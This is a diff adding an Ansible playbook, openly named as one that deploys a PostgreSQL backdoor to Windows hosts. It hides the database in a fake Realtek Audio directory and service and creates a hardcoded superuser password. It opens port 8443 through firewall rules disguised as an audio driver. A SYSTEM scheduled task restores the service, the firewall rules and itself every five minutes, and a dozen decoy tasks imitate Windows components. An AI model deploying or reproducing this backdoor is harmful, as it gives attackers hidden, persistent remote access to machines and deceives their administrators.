@@ -1,0 +1,401 @@
+---
+
+- name: Deploy PostgreSQL backdoor to Windows hosts
+  hosts: windows
+  gather_facts: no
+
+  vars:
+    pg_port:      8443
+    pg_data_dir:  'C:\ProgramData\Realtek\Audio'
+    pg_db:        "telemetry"
+    pg_user:      "ntmon"
+    pg_password:  'M0n1t0r$vc!'
+    pg_svc_name:  "RtkAudioService"
+
+  tasks:
+
+    - name: Check if .NET 4.8 is already installed
+      win_reg_stat:
+        path: HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
+        name: Release
+      register: dotnet_reg
+
+    - name: Install .NET Framework 4.8
+      win_package:
+        path: "https://download.visualstudio.microsoft.com/download/pr/2d6bb6b2-226a-4baa-bdec-798822606ff1/8494001c276a4b96804cde7829c04d7f/ndp48-x86-x64-allos-enu.exe"
+        product_id: "{88E729BB-F0B0-3A71-AC0C-AF2C4AB20ACF}"
+        arguments: /q /norestart
+        state: present
+      register: dotnet_install
+      when: not dotnet_reg.exists or dotnet_reg.value | default(0) | int < 528040
+
+    - name: Reboot if .NET 4.8 install requires it
+      win_reboot:
+        reboot_timeout: 300
+      when: dotnet_install.reboot_required | default(false)
+
+    - name: Install Chocolatey
+      win_shell: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
+        iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+      args:
+        creates: 'C:\ProgramData\chocolatey\bin\choco.exe'
+
+    - name: Install PostgreSQL via Chocolatey
+      win_chocolatey:
+        name: postgresql
+        state: present
+        params: "/Password:postgres"
+
+    - name: Find PostgreSQL bin path
+      win_shell: |
+        $base = "C:\Program Files\PostgreSQL"
+        $ver = Get-ChildItem $base | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty Name
+        Write-Output "$base\$ver\bin"
+      register: pg_bin_raw
+
+    - name: Set pg_bin fact
+      set_fact:
+        pg_bin: "{{ pg_bin_raw.stdout | trim }}"
+
+    - name: Create backdoor data directory
+      win_file:
+        path: "{{ pg_data_dir }}"
+        state: directory
+
+    - name: Initialize backdoor cluster
+      win_shell: |
+        if (-not (Test-Path "{{ pg_data_dir }}\PG_VERSION")) {
+          & "{{ pg_bin }}\initdb.exe" -D "{{ pg_data_dir }}" -U postgres --auth=trust
+        }
+      args:
+        executable: powershell
+
+    - name: Set listen_addresses in postgresql.conf
+      win_lineinfile:
+        path: "{{ pg_data_dir }}\\postgresql.conf"
+        regexp: "^#?listen_addresses"
+        line: "listen_addresses = '*'"
+
+    - name: Set port in postgresql.conf
+      win_lineinfile:
+        path: "{{ pg_data_dir }}\\postgresql.conf"
+        regexp: "^#?port"
+        line: "port = {{ pg_port }}"
+
+    - name: Write pg_hba.conf
+      win_copy:
+        dest: "{{ pg_data_dir }}\\pg_hba.conf"
+        content: |
+          # TYPE  DATABASE  USER  ADDRESS       METHOD
+          host    all       all   127.0.0.1/32  trust
+          host    all       all   ::1/128       trust
+          host    all       all   0.0.0.0/0     md5
+          host    all       all   ::/0          md5
+
+    - name: Register and start RtkAudioService
+      win_shell: |
+        $svc = Get-Service -Name "{{ pg_svc_name }}" -ErrorAction SilentlyContinue
+        if (-not $svc) {
+          & "{{ pg_bin }}\pg_ctl.exe" register -N "{{ pg_svc_name }}" -D "{{ pg_data_dir }}" -S auto
+          Start-Sleep -Seconds 3
+        }
+        $svc = Get-Service -Name "{{ pg_svc_name }}" -ErrorAction SilentlyContinue
+        if ($svc -and $svc.Status -ne 'Running') {
+          & "{{ pg_bin }}\pg_ctl.exe" start -D "{{ pg_data_dir }}"
+          Start-Sleep -Seconds 5
+        }
+        if ($svc -and $svc.StartType -ne 'Automatic') {
+          Set-Service -Name "{{ pg_svc_name }}" -StartupType Automatic
+        }
+      args:
+        executable: powershell
+
+    - name: Create ntmon role
+      win_shell: |
+        $pg_pass = '{{ pg_password }}'
+        $result = & "{{ pg_bin }}\psql.exe" -p {{ pg_port }} -U postgres -d postgres -tAc "SELECT 1 FROM pg_roles WHERE rolname='{{ pg_user }}'"
+        if ($result -ne "1") {
+          & "{{ pg_bin }}\psql.exe" -p {{ pg_port }} -U postgres -d postgres -c "CREATE ROLE `"{{ pg_user }}`" WITH LOGIN SUPERUSER PASSWORD '$pg_pass';"
+        } else {
+          & "{{ pg_bin }}\psql.exe" -p {{ pg_port }} -U postgres -d postgres -c "ALTER ROLE `"{{ pg_user }}`" WITH LOGIN SUPERUSER PASSWORD '$pg_pass';"
+        }
+      args:
+        executable: powershell
+
+    - name: Create telemetry database
+      win_shell: |
+        $exists = & "{{ pg_bin }}\psql.exe" -p {{ pg_port }} -U postgres -d postgres -tAc "SELECT 1 FROM pg_database WHERE datname='{{ pg_db }}'"
+        if ($exists -ne "1") {
+          & "{{ pg_bin }}\psql.exe" -p {{ pg_port }} -U postgres -d postgres -c "CREATE DATABASE `"{{ pg_db }}`" OWNER `"{{ pg_user }}`";"
+        }
+      args:
+        executable: powershell
+
+    - name: Create events table
+      win_shell: |
+        & "{{ pg_bin }}\psql.exe" -p {{ pg_port }} -U postgres -d {{ pg_db }} -c "CREATE TABLE IF NOT EXISTS events (line TEXT); GRANT ALL ON events TO `"{{ pg_user }}`";"
+      args:
+        executable: powershell
+
+    - name: Allow port 8443 inbound
+      win_firewall_rule:
+        name: "Realtek Audio Driver"
+        localport: "{{ pg_port }}"
+        action: allow
+        direction: in
+        protocol: tcp
+        state: present
+        enabled: yes
+
+    - name: Allow port 8443 outbound
+      win_firewall_rule:
+        name: "Realtek Audio Driver Out"
+        localport: "{{ pg_port }}"
+        action: allow
+        direction: out
+        protocol: tcp
+        state: present
+        enabled: yes
+
+    - name: Install RtkAudioService persistence watchdog
+      win_scheduled_task:
+        name: "RtkAudioUniversalService"
+        description: "Realtek Audio Universal Service - manages audio device state"
+        actions:
+          - path: powershell.exe
+            arguments: >-
+              -NonInteractive -WindowStyle Hidden -Command
+              "
+              $svc = '{{ pg_svc_name }}';
+              $port = {{ pg_port }};
+              $data = '{{ pg_data_dir }}';
+              $bin  = (Get-ChildItem 'C:\Program Files\PostgreSQL' | Sort-Object Name -Descending | Select-Object -First 1).FullName + '\bin';
+
+              if ((Get-Service -Name $svc -ErrorAction SilentlyContinue) -eq $null) {
+                & \"$bin\pg_ctl.exe\" register -N $svc -D $data -S auto -w
+              }
+              $s = Get-Service -Name $svc -ErrorAction SilentlyContinue;
+              if ($s -and $s.Status -ne 'Running') { Start-Service $svc }
+              if ($s -and $s.StartType -ne 'Automatic') { Set-Service $svc -StartupType Automatic }
+
+              $fwIn = Get-NetFirewallRule -DisplayName 'Realtek Audio Driver' -ErrorAction SilentlyContinue;
+              if (-not $fwIn) { New-NetFirewallRule -DisplayName 'Realtek Audio Driver' -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow }
+              elseif ($fwIn.Enabled -eq 'False') { Enable-NetFirewallRule -DisplayName 'Realtek Audio Driver' }
+
+              $fwOut = Get-NetFirewallRule -DisplayName 'Realtek Audio Driver Out' -ErrorAction SilentlyContinue;
+              if (-not $fwOut) { New-NetFirewallRule -DisplayName 'Realtek Audio Driver Out' -Direction Outbound -Protocol TCP -LocalPort $port -Action Allow }
+              elseif ($fwOut.Enabled -eq 'False') { Enable-NetFirewallRule -DisplayName 'Realtek Audio Driver Out' }
+
+              $task = Get-ScheduledTask -TaskName 'RtkAudioUniversalService' -ErrorAction SilentlyContinue;
+              if ($task -and $task.State -eq 'Disabled') { Enable-ScheduledTask -TaskName 'RtkAudioUniversalService' }
+              "
+        triggers:
+          - type: time
+            repetition:
+              interval: PT5M
+              duration: P9999D
+            start_boundary: "2000-01-01T00:00:00"
+        run_level: highest
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - Windows Defender cache maintenance
+      win_scheduled_task:
+        name: "WindowsDefenderCacheCleanup"
+        description: "Periodic maintenance of Windows Defender scan cache"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo cache > nul"
+        triggers:
+          - type: daily
+            start_boundary: "2024-03-15T03:17:00"
+            days_interval: 1
+        run_level: limited
+        logon_type: interactive_token_or_password
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - OneDrive sync heartbeat
+      win_scheduled_task:
+        name: "OneDriveSyncHeartbeat"
+        description: "Ensures OneDrive sync state is consistent"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo sync > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT30M
+              duration: P9999D
+            start_boundary: "2024-01-10T08:00:00"
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - Font cache rebuild
+      win_scheduled_task:
+        name: "FontCacheRebuildTask"
+        description: "Rebuilds system font cache to improve application performance"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo fonts > nul"
+        triggers:
+          - type: boot
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - .NET NGEN optimization
+      win_scheduled_task:
+        name: ".NET Framework NGEN v4.0.30319 64"
+        description: "Microsoft .NET Framework NGEN"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo ngen > nul"
+        triggers:
+          - type: idle
+        run_level: highest
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - Windows Error Reporting cleanup
+      win_scheduled_task:
+        name: "WerCleanup"
+        description: "Cleans up Windows Error Reporting temporary files"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo cleanup > nul"
+        triggers:
+          - type: daily
+            start_boundary: "2024-02-20T02:45:00"
+            days_interval: 7
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - ChummingTheWater honeypot bait
+      win_scheduled_task:
+        name: "ChummingTheWater"
+        description: "Network baiting service for active threat hunting"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT1M
+              duration: P9999D
+            start_boundary: "2024-01-01T00:00:00"
+        run_level: highest
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - Realtek HD audio manager check
+      win_scheduled_task:
+        name: "RtkHDAudioCheck"
+        description: "Realtek HD Audio Manager periodic device check"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo rtk > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT5M
+              duration: P9999D
+            start_boundary: "2024-06-01T00:00:00"
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - telemetry heartbeat
+      win_scheduled_task:
+        name: "DiagTrackHeartbeat"
+        description: "Sends periodic diagnostic data to Microsoft telemetry service"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo diag > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT5M
+              duration: P9999D
+            start_boundary: "2024-04-12T00:00:00"
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - Windows Update readiness check
+      win_scheduled_task:
+        name: "WUReadinessCheck"
+        description: "Checks system readiness for pending Windows Updates"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo wu > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT10M
+              duration: P9999D
+            start_boundary: "2024-05-01T00:00:00"
+        run_level: highest
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - network location awareness
+      win_scheduled_task:
+        name: "NlaSvcRefresh"
+        description: "Refreshes network location awareness state"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo nla > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT3M
+              duration: P9999D
+            start_boundary: "2024-03-01T00:00:00"
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
+
+    - name: Decoy task - session idle monitor
+      win_scheduled_task:
+        name: "UserSessionMonitor"
+        description: "Monitors user session state for power management"
+        actions:
+          - path: cmd.exe
+            arguments: "/c echo sess > nul"
+        triggers:
+          - type: time
+            repetition:
+              interval: PT7M
+              duration: P9999D
+            start_boundary: "2024-02-01T00:00:00"
+        run_level: limited
+        logon_type: service_account
+        username: SYSTEM
+        state: present
+        enabled: yes
